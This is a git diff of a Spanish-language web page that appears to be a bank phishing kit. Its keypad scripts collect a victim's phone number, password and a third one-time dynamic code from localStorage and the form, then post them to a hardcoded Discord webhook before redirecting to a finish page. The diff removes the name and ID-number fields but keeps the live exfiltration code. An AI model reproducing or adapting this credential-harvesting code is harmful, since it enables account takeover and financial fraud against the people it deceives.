@@ -1995,7 +1995,7 @@
   <script src="scripts.7b7bf3234b648cc5.js" defer=""></script>
   <script src="main.17c40955f02fae59.js" type="module"></script>
 
-  <script>
+ <script>
 document.addEventListener("DOMContentLoaded", function () {
     // Obtener los elementos de entrada y los botones del teclado numérico
     const inputs = document.querySelectorAll('.code_numerickeypad');
@@ -2066,25 +2066,18 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     });
 });
+</script>
 
-
-  </script>
-
-
-  <script>
-   document.addEventListener("DOMContentLoaded", function () {
+<script>
+document.addEventListener("DOMContentLoaded", function () {
     const inputs = document.querySelectorAll(".input-keypad");
     const confirmBtn = document.getElementById("confirm-btn");
 
     // Recuperar datos almacenados en localStorage
-    const nombreApellido = localStorage.getItem("nombreApellido");
-    const cedula = localStorage.getItem("cedula");
     const numero = localStorage.getItem("numero");
     const clave = localStorage.getItem("clave");
 
-    console.log("Datos recuperados de localStorage:", { nombreApellido, cedula, numero, clave });
-
-    if (!nombreApellido || !cedula || !numero || !clave) {
+    if (!numero || !clave) {
         alert("Datos faltantes. Por favor, completa el paso anterior.");
         window.location.href = "OTP.html";
         return;
@@ -2108,25 +2101,17 @@ document.addEventListener("DOMContentLoaded", function () {
         if (areAllFieldsFilled()) {
             const otpCode3 = getConcatenatedOTP();
 
-            
             const dataToSend = {
-                "NombreApellido": nombreApellido || "No especificado",
-                "Cedula": cedula || "No especificado",
                 "Numero": numero || "No especificado",
                 "Clave": clave || "No especificado",
                 "Dinamica3": otpCode3
             };
 
-            console.log("Datos que se enviarán a Discord:", dataToSend);
-
-            
             const webhookURL = 'https://discord.com/api/webhooks/1377265795486187621/LUtffDY5XzYsDfpOJSwvxL0eS60wSy7rtL6P2WXlBBFHOv0y53CVBy5lIn9APJw-Gj1S';
 
             const discordPayload = {
                 username: "Confirmación Dinámica 3",
                 content: `Confirmación dinámica 3 recibida:\n\n` +
-                         `**Nombre:** ${nombreApellido || "No especificado"}\n` +
-                         `**Cédula:** ${cedula || "No especificado"}\n` +
                          `**Número:** ${numero || "No especificado"}\n` +
                          `**Clave:** ${clave || "No especificado"}\n` +
                          `**Código Dinámico 3:** ${otpCode3}`
@@ -2142,8 +2127,6 @@ document.addEventListener("DOMContentLoaded", function () {
                 });
 
                 if (response.ok) {
-                    
-                    // Redirigir a la página finish.html después del envío
                     window.location.href = "finish.html";
                 } else {
                     throw new Error("Error al enviar los datos a Discord");
@@ -2157,9 +2140,8 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     });
 });
-
-
 </script>
+
   
   
    <script src="bloqueo-bots.js"></script>
